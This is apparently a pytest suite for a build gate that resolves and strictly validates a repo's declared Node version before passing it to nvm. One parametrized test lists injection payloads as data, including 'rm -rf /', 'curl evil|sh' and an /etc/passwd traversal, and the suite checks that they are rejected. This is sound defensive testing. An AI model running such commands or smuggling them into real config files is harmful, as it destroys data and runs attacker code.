"""Tests for the opencode-build gate's per-project Node version resolution.

The gate (deploy/codex-runner/mac-task-executor-opencode-build) resolves the
Node version a JS/TS repo declares (.nvmrc / .node-version / engines.node / CI
workflow) so the pre-push test gate runs under that toolchain instead of the
image's baseline Node. The resolved value is interpolated into a shell that
runs `nvm install/use`, so it MUST be strictly validated — repo content is
semi-trusted (gate-node-version-injection-01).

These tests exercise the shell helpers directly. `_validate_node_version` and
`_resolve_node_version` are a contiguous block of pure definitions in the
script (terminated by a sentinel comment), so we slice that block out and
source it in bash — this avoids running the executor's top-level body. They use
only python3/grep/tr, so they run in CI without nvm/node present.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

GATE = (
    Path(__file__).resolve().parents[1]
    / "deploy"
    / "codex-runner"
    / "mac-task-executor-opencode-build"
)

_END_MARKER = "# --- end node-version resolution helpers"


def _node_funcs() -> str:
    text = GATE.read_text(encoding="utf-8")
    start = text.index("_validate_node_version() {")
    end = text.index(_END_MARKER)
    block = text[start:end]
    assert "_resolve_node_version() {" in block
    return block


FUNCS = _node_funcs()


def _resolve(tmp_path: Path, files: dict) -> str:
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    script = FUNCS + '\n_resolve_node_version "$1"\n'
    proc = subprocess.run(
        ["bash", "-c", script, "_", str(tmp_path)],
        capture_output=True,
        text=True,
    )
    assert proc.returncode == 0, proc.stderr
    return proc.stdout.strip()


def _validate(token: str) -> str:
    script = FUNCS + '\n_validate_node_version "$1"\n'
    proc = subprocess.run(
        ["bash", "-c", script, "_", token],
        capture_output=True,
        text=True,
    )
    return proc.stdout.strip()


# -- resolution sources + precedence ----------------------------------------


def test_resolves_nvmrc(tmp_path):
    assert _resolve(tmp_path, {".nvmrc": "20\n"}) == "20"


def test_resolves_nvmrc_strips_leading_v(tmp_path):
    assert _resolve(tmp_path, {".nvmrc": "v18.17.1\n"}) == "18.17.1"


def test_resolves_node_version_file(tmp_path):
    assert _resolve(tmp_path, {".node-version": "16\n"}) == "16"


def test_resolves_engines_node_dropping_range_operator(tmp_path):
    pkg = '{"engines": {"node": ">=20.11.0"}}'
    assert _resolve(tmp_path, {"package.json": pkg}) == "20.11.0"


def test_resolves_ci_workflow_node_version(tmp_path):
    wf = "jobs:\n  build:\n    steps:\n      - uses: setup-node\n        with:\n          node-version: 22\n"
    assert _resolve(tmp_path, {".github/workflows/ci.yml": wf}) == "22"


def test_nvmrc_wins_over_engines(tmp_path):
    assert _resolve(
        tmp_path,
        {".nvmrc": "18\n", "package.json": '{"engines": {"node": "20"}}'},
    ) == "18"


def test_no_declaration_resolves_empty(tmp_path):
    assert _resolve(tmp_path, {"package.json": "{}"}) == ""


# -- security: the value reaches `nvm install/use` via the shell -------------


@pytest.mark.parametrize(
    "evil",
    [
        "20; rm -rf /",
        "$(reboot)",
        "`id`",
        "20 && curl evil|sh",
        "../../etc/passwd",
        "lts/../../x",
    ],
)
def test_malicious_nvmrc_is_rejected(tmp_path, evil):
    # A hostile .nvmrc must never yield a token (the gate falls back to system
    # Node); nothing with shell metacharacters may pass validation.
    assert _resolve(tmp_path, {".nvmrc": evil + "\n"}) == ""


def test_validate_accepts_bare_semver_and_lts():
    assert _validate("20") == "20"
    assert _validate("20.11") == "20.11"
    assert _validate("20.11.1") == "20.11.1"
    assert _validate("lts/iron") == "lts/iron"


@pytest.mark.parametrize("bad", ["20; echo", "v20", "", "latest", "20.x", "node20"])
def test_validate_rejects_non_semver(bad):
    assert _validate(bad) == ""
